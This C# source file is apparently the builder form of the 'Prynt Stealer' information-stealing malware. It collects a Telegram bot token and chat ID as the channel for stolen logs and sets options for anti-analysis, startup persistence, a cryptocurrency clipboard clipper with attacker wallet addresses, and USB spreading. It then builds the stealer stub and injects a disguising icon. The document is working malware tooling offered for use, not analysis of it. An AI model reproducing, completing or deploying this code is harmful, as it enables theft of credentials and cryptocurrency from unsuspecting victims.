using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Loader;
using Mono.Cecil;
using Mono.Cecil.Cil;


namespace PryntStealer
{

    public partial class Form1 : System.Windows.Forms.Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            
            if (token.Text.Length == 0 || chatid.Text.Length == 0 || password.Text.Trim().Length == 0 || password.Text == "Zip password")
            {
                MessageBox.Show("don t leave it empty");
            }
            else if(password.Text == null) { 
                MessageBox.Show("Password Section Can t be Empy");
                
            }
            else
            {
                bool work = false;
                try
                {
                    sendtg.sendText("👣 Prynt Stealer Has Been Activated password for your logs is "+password.Text.Trim(), chatid.Text, token.Text);
                    work = true;
                }
                catch (Exception error)
                {
                    MessageBox.Show("Check your bot token and chat id");
                }
                if (work)
                {
                    MessageBox.Show("Bot Connected");
                    build.ConfigValues["Telegram API"] = crypt.EncryptConfig(token.Text);
                    build.ConfigValues["Telegram ID"] = crypt.EncryptConfig(chatid.Text);
                    build.ConfigValues["password"] = password.Text.Trim();
                    if (checkBox1.Checked == true)
                    {
                        build.ConfigValues["AntiAnalysis"] = "1";
                    }
                   
                    if (checkBox2.Checked == true)
                    {
                        
                        build.ConfigValues["Startup"] = "1" ;
                        build.ConfigValues["Clipper"] = "1";
                        build.ConfigValues["BTC"] = btc.Text;
                        build.ConfigValues["Etherium"] = eth.Text;
                        build.ConfigValues["LiteCoin"] = ltc.Text;
                        build.ConfigValues["Monero"] = monero.Text;



                    }
                    if (checkBox3.Checked == true)
                    {
                        build.ConfigValues["USB"] = "1";
                    }

                    build.ConfigValues["Sleep"] = numericUpDown1.Value.ToString();
                    string builded = build.BuildStub();
                    if (txtIcon.Text.Length == 0 || File.Exists(txtIcon.Text) == false)
                    {
                        
                        MessageBox.Show("Stealer Saved in " +builded );
                    }
                    else
                    {
                        MessageBox.Show("Stealer Saved in " + builded);
                        IconChanger.InjectIcon(builded, txtIcon.Text);
                    }
                    

                }


            }
        }

        private void btnIconOpen_Click(object sender, EventArgs e)
        {

        }

        private void txtIcon_TextChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Icon (*.ico)|*.ico";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    txtIcon.Text = openFileDialog.FileName;
                    pictureIcon.ImageLocation = openFileDialog.FileName;
                    pictureIcon.BorderStyle = BorderStyle.FixedSingle;
                }
                else
                {
                    txtIcon.Text = string.Empty;
                    pictureIcon.ImageLocation = string.Empty;
                }
            }
        }

        private void txtIcon_TextChanged_1(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(txtIcon.Text))
            {
                txtIcon.Text = string.Empty;
                pictureIcon.ImageLocation = string.Empty;
                pictureIcon.BorderStyle = BorderStyle.None;
            }
        }

        private void Form_Load(object sender, EventArgs e)
        {

        }

     
        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("https://t.me/officialpryntsoftware");
        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void token_TextChanged(object sender, EventArgs e)
        {

        }

        private void bunifuPictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void bunifuButton1_Click(object sender, EventArgs e)
        {
            System.Windows.Forms.Application.Exit();
        }

        private void btc_TextChanged(object sender, EventArgs e)
        {

        }

        private void eth_TextChanged(object sender, EventArgs e)
        {

        }

        private void label6_Click(object sender, EventArgs e)
        {

        }

        private void label9_Click(object sender, EventArgs e)
        {

        }

        private void label8_Click(object sender, EventArgs e)
        {

        }

        private void numericUpDown1_ValueChanged(object sender, EventArgs e)
        {

        }

        private void numericUpDown1_ValueChanged_1(object sender, EventArgs e)
        {

        }

        private void bunifuGradientPanel3_Click(object sender, EventArgs e)
        {

        }

        private void bunifuTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void bunifuButton2_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void siticoneCircleButton1_Click(object sender, EventArgs e)

        {
            Form2 frm2 = new Form2();
            frm2.ShowDialog();

        }

        private void bunifuGradientPanel2_Click(object sender, EventArgs e)
        {
         
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Icon (*.ico)|*.ico";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    txtIcon.Text = openFileDialog.FileName;
                    pictureIcon.ImageLocation = openFileDialog.FileName;
                    pictureIcon.BorderStyle = BorderStyle.FixedSingle;
                }
                else
                {
                    txtIcon.Text = string.Empty;
                    pictureIcon.ImageLocation = string.Empty;
                }
            }
        }
    }
}


            
        
            